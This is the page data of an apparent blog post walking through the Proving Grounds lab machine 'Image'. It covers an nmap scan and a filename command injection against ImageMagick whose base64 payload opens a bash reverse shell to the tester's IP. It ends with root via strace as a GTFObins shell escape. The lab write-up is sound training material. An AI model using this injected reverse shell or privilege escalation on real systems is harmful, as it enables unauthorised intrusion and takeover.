{"componentChunkName":"component---src-templates-post-template-tsx","path":"/241026/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Recon</h2>\n<ul>\n<li>nmap scan</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿kali)-[~]\r\n└─$ sudo nmap 192.168.228.178 -p- -T4\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 16:00 EDT\r\nWarning: 192.168.228.178 giving up on port because retransmission cap hit (6).\r\nNmap scan report for 192.168.228.178\r\nHost is up (0.029s latency).\r\nNot shown: 65497 closed tcp ports (reset), 36 filtered tcp ports (no-response)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 86.27 seconds\r\n</code></pre></div>\n<p>Okay, so it is a simple web application I’d assume.</p>\n<ul>\n<li>port 80</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿kali)-[~]\r\n└─$ sudo nmap 192.168.228.178 -p80 -sC -sV -A -T4\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 16:03 EDT\r\nNmap scan report for 192.168.228.178\r\nHost is up (0.030s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\r\n|_http-title: ImageMagick Identifier\r\n|_http-server-header: Apache/2.4.41 (Ubuntu)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 3.5 (87%), Linux 4.2 (87%), Synology DiskStation Manager 5.1 (87%), Linux 5.3 - 5.4 (87%), Linux 3.10 (86%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 4 hops</code></pre></div>\n<p>Let’s continue with enumeration</p>\n<h2>2. Initial Foothold</h2>\n<p>As I visited the website (port 80):</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/aa38f/1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.8125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+0lEQVR42q3O0WqDMBQGYJ9hVra6iz1i1WmMduvDjN2NXW2v0lFlF0PU1qCYCFVhw381pVZKe9fAxwk55/xE0fUHTDQd6mSKG+lOVvWCff9I1aYD7fYeytx7BnHnIMQDpU+gu7vnL+DQBWziY2Y6MC1XsiwK2/ZhPrqSYRHMDGdgmAQKyzJkO1VVoT9d18la5AXCIMQqWCGKIizDJYKfAM1fgw77mbZt5e6YkqYp4jgG5xyHI0SFzYZhvU6R5zm29RYf3594+XrFW/iO+reWc03ToN8fk4FJkoAxJkN7ZVkO954QAlxwqeTHXlEU5wMPof1Px869nboYeC3/r128w1A8BUAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/a59e9/1.webp 192w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/0ca9f/1.webp 384w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/dc9b9/1.webp 768w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/e2c2f/1.webp 1152w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/3c255/1.webp 1352w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/3b721/1.png 192w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/66595/1.png 384w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/fe486/1.png 768w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/d2d74/1.png 1152w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/aa38f/1.png 1352w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/fe486/1.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>This functionality utilize the ImageMagick. As I uploaded an Image:\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/954a81bcd2eee60c8cd7c764b4bba935/8d021/2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.8125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABIklEQVR42p1STU+DQBDl/59MTIwX438wHtvEUoKH8rXQ1oNSBFI0SE35KFBYeDKboNZDD77N28nsvpnMzK5kmBZMk51wsdAhy3PM5wpmMxmKokJVHzEbzkZfN00Yxk+sZdlYaDqkruswou97YQ+HA2ybDQHGIDagaRpc14XDHKydFdwX91v7G8fjERLnXFyOgu02gu+HiKI3BIGPMAyRZim6psPd8z2u2DVulre40C+FT+AdF7aqKkiUldg0jbC73Sf2+wx5nqMoCmHrugZvOax3hsnrFA+BjIk/hfOxPOmMdFIcx/A8T1SSJAnSdI//QiSkKog0N2r/HPo/i1qlzoht24ocEm3EsiyRZRlW66fhxRgYs8/SHH7HZuOJuVFBY/wXrn4JZxZzUcMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/954a81bcd2eee60c8cd7c764b4bba935/a59e9/2.webp 192w,\n/static/954a81bcd2eee60c8cd7c764b4bba935/0ca9f/2.webp 384w,\n/static/954a81bcd2eee60c8cd7c764b4bba935/dc9b9/2.webp 768w,\n/static/954a81bcd2eee60c8cd7c764b4bba935/2096f/2.webp 902w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/954a81bcd2eee60c8cd7c764b4bba935/3b721/2.png 192w,\n/static/954a81bcd2eee60c8cd7c764b4bba935/66595/2.png 384w,\n/static/954a81bcd2eee60c8cd7c764b4bba935/fe486/2.png 768w,\n/static/954a81bcd2eee60c8cd7c764b4bba935/8d021/2.png 902w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/954a81bcd2eee60c8cd7c764b4bba935/fe486/2.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span>\r\nSo we have the version number of ImageMagick.</p>\n<blockquote>\n<p><a href=\"https://github.com/ImageMagick/ImageMagick/issues/6339\" target=\"_blank\" rel=\"nofollow\">https://github.com/ImageMagick/ImageMagick/issues/6339</a></p>\n</blockquote>\n<p>It seems to be that CVE-2016-5118 is not correctly fixed on this version, which is a quite simple command injection vulnerability on Imagemagick\r\nSo I needed to reproduce this vulnerability, and I found an excellent github source for that:</p>\n<blockquote>\n<p><a href=\"https://github.com/SudoIndividual/CVE-2023-34152\" target=\"_blank\" rel=\"nofollow\">https://github.com/SudoIndividual/CVE-2023-34152</a></p>\n</blockquote>\n<p>I executed it and got a malicious image file.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿kali)-[~/oscp/offsec/image/CVE-2023-34152]\r\n└─$ ls\r\n CVE-2023-34152.py   README.md  '|smile\"`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMDcvODAgMD4mMSI=|base64 -d|bash`\".png'</code></pre></div>\n<p>And I uploaded it to our web endpoint.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿kali)-[~/oscp/offsec/image/CVE-2023-34152]\r\n└─$ python CVE-2023-34152.py 192.168.45.207 80\r\nCreated by SudoIndividual (https://github.com/SudoIndividual)\r\nPNG file (payload) have been created in current directory. Upload the payload to the server\r\nDo you want to run netcat shell? [y/N]y\r\nlistening on [any] 80 ...\r\nconnect to [192.168.45.207] from (UNKNOWN) [192.168.228.178] 38726\r\nbash: cannot set terminal process group (1171): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nwww-data@image:/var/www/html$ \r\n</code></pre></div>\n<p>And I got a shell! (and also the local.txt flag)</p>\n<h2>3. PrivEsc to root</h2>\n<p>I simply ran linpeas. Then:\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/095a4005234969242bd0d80e27a676c8/c0214/4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.1875%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABiUlEQVR42lWSTXaDMAyEc54mGAgpCWAIf8aAgZCSdtuL9O7Tsemmi3kC++nTSNYhSCaE8omw2BA1lHzgnBqE6YQgMTjnK848O2YrjoxBuUIwR9wMxHWAiO4QwY1KnA51a9DpB4q7hu5XDOaFaflC3c7UhH56YZxf+PnW2LYenp5ZpEFQtDgR4Pm3fzoUZY+qMZB5BwtX3QKlF3dm/1s1ox1XzF8z5KBxtIl05IUpY/JPzmFZj2iYlBcaLWHD+EGXm/u2d13/QDc8Ec8bRN5CnN4RelYxzt4VkY0+Iwv5Fnivhh1oW2Zi59r+2B1ad1Q3PqHMiqLWSCMJFWVQF4l7LFHGGXIWyU8X+ATvQM5LFsol62EH2iIl7xTna880Z6mXT1e0NHT8pOOkxIngI52+ib8ZVs3o2rMO7fwszCY1aoK92x1vmPlQE6Fm2tA8PnExfJyBm5BWCLIKgmBPXPdHqdlelivnqv9r27ZclNo5tFvQc7YjwT3d1nQYLVynboQva/hxwfXJCLzhF16KGVf7+t/2AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/095a4005234969242bd0d80e27a676c8/a59e9/4.webp 192w,\n/static/095a4005234969242bd0d80e27a676c8/0ca9f/4.webp 384w,\n/static/095a4005234969242bd0d80e27a676c8/dc9b9/4.webp 768w,\n/static/095a4005234969242bd0d80e27a676c8/c6463/4.webp 796w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/095a4005234969242bd0d80e27a676c8/3b721/4.png 192w,\n/static/095a4005234969242bd0d80e27a676c8/66595/4.png 384w,\n/static/095a4005234969242bd0d80e27a676c8/fe486/4.png 768w,\n/static/095a4005234969242bd0d80e27a676c8/c0214/4.png 796w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/095a4005234969242bd0d80e27a676c8/fe486/4.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span>\r\nwe can run strace as root! GTFObins is your friend as always :)</p>\n<blockquote>\n<p><a href=\"https://gtfobins.github.io/gtfobins/strace/\" target=\"_blank\" rel=\"nofollow\">https://gtfobins.github.io/gtfobins/strace/</a></p>\n</blockquote>\n<p>I followed the exact step, then got root!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">www-data@image:/var/www$ /usr/bin/strace -o /dev/null /bin/sh -p\r\n/usr/bin/strace -o /dev/null /bin/sh -p\r\nwhoami\r\nroot</code></pre></div>\n<p>Done!</p>","frontmatter":{"title":"Proving Grounds : Image","summary":"Solving Image machine from Proving Grounds","date":"2024.10.26.","before":"2024.10.24.","after":"2024.10.26.","categories":["proving_grounds","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+0lEQVR42q3O0WqDMBQGYJ9hVra6iz1i1WmMduvDjN2NXW2v0lFlF0PU1qCYCFVhw381pVZKe9fAxwk55/xE0fUHTDQd6mSKG+lOVvWCff9I1aYD7fYeytx7BnHnIMQDpU+gu7vnL+DQBWziY2Y6MC1XsiwK2/ZhPrqSYRHMDGdgmAQKyzJkO1VVoT9d18la5AXCIMQqWCGKIizDJYKfAM1fgw77mbZt5e6YkqYp4jgG5xyHI0SFzYZhvU6R5zm29RYf3594+XrFW/iO+reWc03ToN8fk4FJkoAxJkN7ZVkO954QAlxwqeTHXlEU5wMPof1Px869nboYeC3/r128w1A8BUAAAAAASUVORK5CYII="},"images":{"fallback":{"src":"/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/ab823/1.png","srcSet":"/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/98a83/1.png 338w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/a72e4/1.png 676w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/ab823/1.png 1352w","sizes":"(min-width: 1352px) 1352px, 100vw"},"sources":[{"srcSet":"/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/94528/1.webp 338w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/0931e/1.webp 676w,\n/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/715d1/1.webp 1352w","type":"image/webp","sizes":"(min-width: 1352px) 1352px, 100vw"}]},"width":1352,"height":444}},"publicURL":"/static/3d7bd4d0ff86f9fe06e62f804bdedaeb/1.png"}}}}]}},"pageContext":{"slug":"/241026/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}